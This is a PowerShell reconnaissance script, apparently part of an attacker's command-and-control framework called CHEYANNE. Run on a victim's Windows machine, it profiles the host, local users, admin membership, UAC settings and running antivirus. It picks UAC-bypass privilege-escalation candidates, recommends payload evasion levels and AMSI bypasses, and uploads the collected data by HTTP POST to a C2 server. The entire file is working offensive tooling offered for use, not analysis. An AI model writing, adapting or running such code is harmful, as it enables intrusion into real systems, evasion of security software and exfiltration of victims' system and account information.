# recon_drop.ps1 -- CHEYANNE C2 Target Recon Drop
# 22DIV / george wu
#
# Runs as STANDARD USER -- no elevation required.
# Outputs JSON to $env:TEMP\chey_recon.json
# Optionally POSTs to C2 if $env:CHEY_HOST is set.
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File recon_drop.ps1
#   powershell -ep bypass .\recon_drop.ps1

$ErrorActionPreference = "SilentlyContinue"

# ═══════════════════════════════════════════════════════════════
# INIT
# ═══════════════════════════════════════════════════════════════

$outJson = Join-Path $env:TEMP "chey_recon.json"
$data = @{}

# ═══════════════════════════════════════════════════════════════
# SYSTEM IDENTITY
# ═══════════════════════════════════════════════════════════════

$data["hostname"]    = $env:COMPUTERNAME
$data["username"]    = $env:USERNAME
$data["userdomain"]  = $env:USERDOMAIN

$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
if ($os) {
    $data["os_name"]     = $os.Caption
    $data["os_build"]    = [int]$os.BuildNumber
    $data["os_version"]  = $os.Version
    $data["os_arch"]     = $os.OSArchitecture
} else {
    $data["os_name"]    = ""
    $data["os_build"]   = 0
    $data["os_version"] = ""
    $data["os_arch"]    = ""
}

# Architecture normalised to x64/x86
if ($data["os_arch"] -match "64") {
    $data["arch"] = "x64"
} else {
    $data["arch"] = "x86"
}

# ═══════════════════════════════════════════════════════════════
# POWERSHELL + .NET VERSION
# ═══════════════════════════════════════════════════════════════

$data["ps_version"]  = [int]$PSVersionTable.PSVersion.Major

$dotnetVersions = @()
try {
    $ndpPath = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP"
    Get-ChildItem $ndpPath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $ver = (Get-ItemProperty $_.PSPath -Name Version -ErrorAction SilentlyContinue).Version
        if ($ver) { $dotnetVersions += $ver }
    }
} catch {}
# Also try the v4 Full key which gives the release number
$v4rel = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release -ErrorAction SilentlyContinue).Release
if ($v4rel) {
    # Map release number to version string
    $v4str = switch ($v4rel) {
        {$_ -ge 533320} { "4.8.1" }
        {$_ -ge 528040} { "4.8" }
        {$_ -ge 461808} { "4.7.2" }
        {$_ -ge 461308} { "4.7.1" }
        {$_ -ge 460798} { "4.7" }
        {$_ -ge 394802} { "4.6.2" }
        {$_ -ge 394254} { "4.6.1" }
        {$_ -ge 393295} { "4.6" }
        default         { "4.5+" }
    }
    $dotnetVersions += $v4str
}
$data["dotnet_version"] = ($dotnetVersions | Select-Object -Unique | Sort-Object -Descending | Select-Object -First 1)
if (-not $data["dotnet_version"]) { $data["dotnet_version"] = "" }

# ═══════════════════════════════════════════════════════════════
# ADMIN STATUS
# ═══════════════════════════════════════════════════════════════

try {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $data["is_admin"] = ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {
    $data["is_admin"] = $false
}

# ═══════════════════════════════════════════════════════════════
# UAC CONFIGURATION
# ═══════════════════════════════════════════════════════════════

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$luaVal = (Get-ItemProperty $uacPath -Name "EnableLUA" -ErrorAction SilentlyContinue).EnableLUA
$data["uac_enabled"] = ($luaVal -eq 1)

# ConsentPromptBehaviorAdmin levels:
#   0 = elevate without prompting (no UAC popup)
#   1 = prompt for creds on secure desktop
#   2 = prompt for consent on secure desktop
#   3 = prompt for creds (non-secure desktop)
#   4 = prompt for consent (non-secure desktop)
#   5 = default (prompt for consent on secure desktop for non-Windows binaries)
$cpba = (Get-ItemProperty $uacPath -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
if ($cpba -eq $null) { $cpba = 5 }

# Normalise to the 3 meaningful categories for payload selection
# 0 = no prompt (auto-elevate), 2 = desktop (non-secure), 5 = secure desktop
if ($cpba -eq 0) {
    $data["uac_level"] = 0
} elseif ($cpba -in @(4,3)) {
    $data["uac_level"] = 2
} else {
    $data["uac_level"] = 5
}

# ═══════════════════════════════════════════════════════════════
# AV DETECTION
# ═══════════════════════════════════════════════════════════════

$avTargets = @("MsMpEng","avp","avgnt","avguard","bdservicehost","ekrn","mbamservice","savservice","sophos")
$avDetected = @()
try {
    $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName
    foreach ($av in $avTargets) {
        $matched = $runningProcs | Where-Object { $_ -like "*$av*" } | Select-Object -First 1
        if ($matched) { $avDetected += $matched }
    }
} catch {}
$data["av_detected"] = $avDetected

$data["has_kaspersky"] = ($avDetected | Where-Object { $_ -match "avp" }).Count -gt 0
$data["has_defender"]  = ($avDetected | Where-Object { $_ -match "MsMpEng" }).Count -gt 0

# Defender real-time protection via Get-MpComputerStatus
$defenderRt = $false
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction Stop
    $defenderRt = [bool]$mpStatus.RealTimeProtectionEnabled
} catch {}
$data["defender_realtime"] = $defenderRt

# ═══════════════════════════════════════════════════════════════
# NETWORK
# ═══════════════════════════════════════════════════════════════

$networkIPs = @()
try {
    Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.IPAddress -ne "127.0.0.1") {
            $iface = Get-NetAdapter -InterfaceIndex $_.InterfaceIndex -ErrorAction SilentlyContinue
            $ifName = if ($iface) { $iface.Name } else { "adapter$($_.InterfaceIndex)" }
            $networkIPs += "${ifName}/$($_.IPAddress)"
        }
    }
} catch {}
$data["network_ips"] = $networkIPs

# ═══════════════════════════════════════════════════════════════
# LOCAL USERS
# ═══════════════════════════════════════════════════════════════

$localUsers = @()
try {
    Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True" -ErrorAction SilentlyContinue | ForEach-Object {
        $localUsers += $_.Name
    }
} catch {}
$data["local_users"] = $localUsers

# Administrators group members
$adminMembers = @()
try {
    $adminGroup = Get-CimInstance Win32_GroupUser -ErrorAction SilentlyContinue | Where-Object {
        $_.GroupComponent -match 'Win32_Group.Domain="[^"]+",Name="Administrators"'
    }
    if ($adminGroup) {
        $adminMembers = $adminGroup | ForEach-Object {
            if ($_.PartComponent -match 'Name="([^"]+)"') { $Matches[1] }
        } | Where-Object { $_ }
    } else {
        # Fallback: net localgroup
        $nlOut = net localgroup Administrators 2>$null
        $capture = $false
        foreach ($line in $nlOut) {
            if ($line -match "^-{5,}") { $capture = $true; continue }
            if ($capture -and $line.Trim() -and $line -notmatch "command completed") {
                $adminMembers += $line.Trim()
            }
        }
    }
} catch {}
$data["admin_members"] = $adminMembers
$data["user_is_admin_member"] = ($adminMembers | Where-Object { $_ -ieq $env:USERNAME }).Count -gt 0

# ═══════════════════════════════════════════════════════════════
# LISTENING PORTS
# ═══════════════════════════════════════════════════════════════

$listeningPorts = @()
try {
    $nsOut = netstat -an 2>$null | Select-String "LISTENING" | Select-Object -First 20
    foreach ($line in $nsOut) {
        $trimmed = $line.ToString().Trim()
        if ($trimmed) { $listeningPorts += $trimmed }
    }
} catch {}
$data["listening_ports"] = $listeningPorts

# ═══════════════════════════════════════════════════════════════
# PRIVESC CANDIDATES
# ═══════════════════════════════════════════════════════════════

$privescCandidates = @()

# Only populate if NOT already admin AND UAC is enabled
if (-not $data["is_admin"] -and $data["uac_enabled"]) {
    $build = $data["os_build"]

    # fodhelper: Win10+ build >= 10240
    if ($build -ge 10240) {
        $privescCandidates += "fodhelper"
    }

    # eventvwr: Win8+ build >= 9200
    if ($build -ge 9200) {
        $privescCandidates += "eventvwr"
    }

    # sdclt: build >= 10240
    if ($build -ge 10240) {
        $privescCandidates += "sdclt"
    }

    # computerdefaults: build >= 10240
    if ($build -ge 10240) {
        $privescCandidates += "computerdefaults"
    }
}

$data["privesc_candidates"] = $privescCandidates

# ═══════════════════════════════════════════════════════════════
# PAYLOAD RECOMMENDATIONS
# ═══════════════════════════════════════════════════════════════

# FUD level
if ($data["has_kaspersky"]) {
    $fudLevel = "max"
} elseif ($data["defender_realtime"]) {
    $fudLevel = "high"
} else {
    $fudLevel = "standard"
}

# AMSI bypass needed if PS >= 5
$amsiBypass = ($data["ps_version"] -ge 5)

# Privesc needed
$needsPrivesc = -not $data["is_admin"]

# Best privesc
$bestPrivesc = if ($privescCandidates.Count -gt 0) { $privescCandidates[0] } else { "none" }

$data["payload_recommendations"] = @{
    fud_level             = $fudLevel
    ps_amsi_bypass_needed = $amsiBypass
    needs_privesc         = $needsPrivesc
    best_privesc          = $bestPrivesc
    arch                  = $data["arch"]
}

# ═══════════════════════════════════════════════════════════════
# WRITE JSON OUTPUT
# ═══════════════════════════════════════════════════════════════

try {
    $jsonOut = $data | ConvertTo-Json -Depth 5 -Compress:$false
    [System.IO.File]::WriteAllText($outJson, $jsonOut, [System.Text.Encoding]::UTF8)
} catch {
    # Last-resort fallback
    $data | ConvertTo-Json -Depth 5 | Out-File $outJson -Encoding utf8
}

# ═══════════════════════════════════════════════════════════════
# OPTIONAL C2 UPLOAD
# ═══════════════════════════════════════════════════════════════

if ($env:CHEY_HOST) {
    try {
        $uploadUri = "http://$($env:CHEY_HOST):8890/recon_upload"
        $jsonBody  = [System.IO.File]::ReadAllText($outJson)
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type","application/json")
        $wc.UploadString($uploadUri, "POST", $jsonBody) | Out-Null
    } catch {}
}

# ═══════════════════════════════════════════════════════════════
# CONSOLE SUMMARY
# ═══════════════════════════════════════════════════════════════

$adminStr   = if ($data["is_admin"]) { "ADMIN" } else { "USER" }
$kavStr     = if ($data["has_kaspersky"]) { "KAV=YES" } else { "KAV=NO" }
$defStr     = if ($data["defender_realtime"]) { "DEFENDER=REALTIME" } else { "DEFENDER=OFF" }

Write-Host "[RECON] Host=$($data['hostname']) User=$($data['username']) $adminStr $kavStr $defStr JSON=$outJson"
